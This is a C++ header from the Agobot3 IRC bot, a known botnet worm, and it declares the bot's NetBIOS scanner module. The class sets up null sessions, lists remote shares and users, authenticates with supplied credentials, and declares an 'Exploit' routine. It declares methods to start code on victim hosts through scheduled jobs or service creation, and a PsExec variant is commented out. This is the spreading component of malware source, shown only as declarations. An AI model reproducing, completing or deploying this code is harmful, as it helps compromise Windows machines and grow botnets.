/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __NBSCANNER_H__
#define __NBSCANNER_H__

#include "cstring.h"
#include "scanner.h"

#ifdef WIN32
typedef struct shareinfo_s
{	CString sName;
	CString sRemark; } shareinfo;

typedef struct userinfo_s
{	CString sName;
	CString sServer; } userinfo;

class CScannerNetBios : public CScannerBase
{
public:
	CScannerNetBios();
	virtual ~CScannerNetBios() throw() { }
	virtual void StartScan(const CString &sHost);
	virtual bool TestHost(const CString &sHost) { return true; }
protected:
	NET_API_STATUS m_NetApiStatus;
	USE_INFO_2 m_UseInfo;
	USER_INFO_1 *m_UserInfo;
	SHARE_INFO_1* m_ShareInfo;

	WCHAR m_wszHost[MAX_PATH];
	WCHAR m_wszServer[MAX_PATH];
	WCHAR m_wszResource[MAX_PATH];

	bool m_bGotShares;
	bool m_bGotUsers;

	list<userinfo*> m_lUsers;
	list<shareinfo*> m_lShares;

	bool NullSession();
	bool CloseSession();
	bool GetShares(list<shareinfo*> *lpShares);
	bool GetUsers(list<userinfo*> *lpUsers);
	bool AuthSession(const char *user, const char *password);
	bool Exploit(const char *share, const char *host, const char *user, const char *password);
	bool StartViaNetScheduleJobAdd(const char *share, const char *host, const char *user, const char *password);
	bool StartViaCreateService(const char *share, const char *host, const char *user, const char *password);
//	bool StartViaPSExec(const CString &sReplyTo, const char *share, const char *host, const char *user, const char *password);
};
#endif // WIN32

#endif // __NBSCANNER_H__
